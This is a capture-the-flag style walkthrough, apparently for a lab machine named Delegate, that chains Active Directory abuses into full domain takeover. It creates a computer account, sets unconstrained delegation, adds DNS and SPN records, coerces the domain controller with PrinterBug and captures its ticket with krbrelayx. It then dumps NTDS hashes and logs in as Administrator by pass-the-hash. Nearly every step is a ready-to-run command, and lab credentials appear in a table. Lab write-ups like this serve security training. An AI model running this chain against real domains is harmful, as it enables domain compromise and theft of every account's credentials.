# Unconstrained Delegation via a Created Computer

A user session with `SeMachineAccountPrivilege` and `SeEnableDelegationPrivilege` led to this path: create a computer account, mark it trusted for unconstrained delegation, give it a resolvable hostname and CIFS SPN, coerce the DC to authenticate to it, then use the captured DC machine ticket. The commands below follow the successful Delegate trace, with target values shown as placeholders.

## 1. Identify the privileges from the user session

Start with the token, before changing any directory objects:

```powershell
whoami /all
```

Relevant output from the successful session:

```text
Group Name
----------
DELEGATE\delegation admins
BUILTIN\Remote Management Users

Privilege Name                State
----------------------------  -------
SeMachineAccountPrivilege     Enabled
SeEnableDelegationPrivilege   Enabled
```

`SeMachineAccountPrivilege` provided the computer creation path. The account also had `SeEnableDelegationPrivilege`, which was used when setting `TRUSTED_FOR_DELEGATION` on the new computer. In this trace, the user had reached WinRM after a `GenericWrite` edge to its account and a targeted Kerberoast. See [ACL abuse](acl-abuse.md) and [Kerberoasting](Kerberos-cheatsheet.md#targeted-kerberoasting-via-genericallgenericwrite) for those earlier techniques.

Use these placeholders in the remaining commands:

| Placeholder | Meaning | Delegate value |
| --- | --- | --- |
| `<DOMAIN>` | DNS domain | `delegate.vl` |
| `<REALM>` | Uppercase Kerberos realm | `DELEGATE.VL` |
| `<DOMAIN_DN>` | Domain distinguished name | `DC=delegate,DC=vl` |
| `<DC_IP>` / `<DC_FQDN>` | Domain controller | `10.129.234.69` / `dc1.delegate.vl` |
| `<USER>` / `<USER_PASSWORD>` | User with the observed privileges | `n.thompson` / `KALEB_2341` |
| `<COMPUTER>` / `<COMPUTER_PASSWORD>` | New account, including its trailing `$` | `rbcd-test$` / `Megaman!1` |
| `<COMPUTER_FQDN>` | Hostname for the new account | `rbcd-test.delegate.vl` |
| `<LISTENER_IP>` | IP receiving the coerced authentication | `10.10.14.51` |

## 2. Confirm the domain conditions

From the attacking machine, read the machine account quota and enumerate accounts already trusted for delegation:

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<USER_PASSWORD>' --host <DC_IP> get object '<DOMAIN_DN>' --attr ms-DS-MachineAccountQuota
nxc ldap <DC_FQDN> -u <USER> -p '<USER_PASSWORD>' --trusted-for-delegation
```

The trace showed `ms-DS-MachineAccountQuota: 10` and listed `DC1$` as trusted for delegation. The quota allowed the user to create a computer account.

## 3. Create a computer and inspect the rights on it

```bash
impacket-addcomputer -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<USER_PASSWORD>'

python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<USER_PASSWORD>' --host <DC_IP> get writable --otype COMPUTER --right WRITE --detail
```

The computer creation succeeded. The rights output for the new object included `userAccountControl: WRITE`, the attribute changed in the next step. The observed account name was `rbcd-test$`, but this chain used unconstrained delegation, not resource-based constrained delegation.

## 4. Prepare DNS, the delegation flag, and the SPN

Point the new hostname at the listener, then set `TRUSTED_FOR_DELEGATION` on the computer account:

```bash
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<USER_PASSWORD>' --action add --record <COMPUTER_FQDN> --type A --data <LISTENER_IP> -dns-ip <DC_IP> <DC_FQDN>

python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<USER_PASSWORD>' --host <DC_FQDN> add uac '<COMPUTER>' -f TRUSTED_FOR_DELEGATION
```

Both LDAP changes succeeded in the trace. Set `dNSHostName` to that FQDN, verify it, and add a matching CIFS SPN. Do this before coercing the DC: the successful capture used the hostname and SPN together.

```bash
python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<USER_PASSWORD>' --host <DC_IP> set object '<COMPUTER>' dNSHostName -v '<COMPUTER_FQDN>'

python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<USER_PASSWORD>' --host <DC_IP> get object '<COMPUTER_DN>' --attr dNSHostName,servicePrincipalName,msDS-AdditionalDnsHostName

python3 addspn.py <DC_IP> -u '<DOMAIN>\<COMPUTER>' -t '<COMPUTER>' -s 'cifs/<COMPUTER_FQDN>'
# Enter <COMPUTER_PASSWORD> at the prompt.
```

For Delegate, `<COMPUTER_DN>` was `CN=rbcd-test,CN=Computers,DC=delegate,DC=vl`. The verification showed `dNSHostName: rbcd-test.delegate.vl`, and `addspn.py` reported `SPN Modified successfully`.

## 5. Capture the DC machine ticket

The observed Kerberos salt for the computer's password was the uppercase realm followed by `host` and the computer FQDN: `<REALM>host<COMPUTER_FQDN>`. Start `krbrelayx` in ticket export mode:

```bash
python3 krbrelayx.py --krbpass '<COMPUTER_PASSWORD>' --krbsalt '<REALM>host<COMPUTER_FQDN>' -dc-ip <DC_IP>
```

In a second terminal, coerce the DC with NetExec's PrinterBug method, targeting the hostname configured above:

```bash
netexec smb <DC_FQDN> -u '<COMPUTER>' -p '<COMPUTER_PASSWORD>' -M coerce_plus -o LISTENER=<COMPUTER_FQDN> METHOD=PrinterBug
```

The successful trace reported `Exploit Success` for `spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx`. `krbrelayx` then logged `Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]` and saved a `.ccache` file.

## 6. Use the ticket and verify access

Generate the Kerberos configuration, then point `KRB5CCNAME` at the saved DC machine ticket:

```bash
netexec smb <DOMAIN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

KRB5CCNAME='<PATH_TO_DC_MACHINE_CCACHE>' netexec smb <DOMAIN> --use-kcache --ntds
```

The Delegate run authenticated as `DELEGATE.VL\DC1$` and dumped 10 NTDS hashes. Its Administrator NT hash then authenticated over WinRM:

```bash
evil-winrm -i <DC_IP> -u Administrator -H <ADMIN_NT_HASH>
```
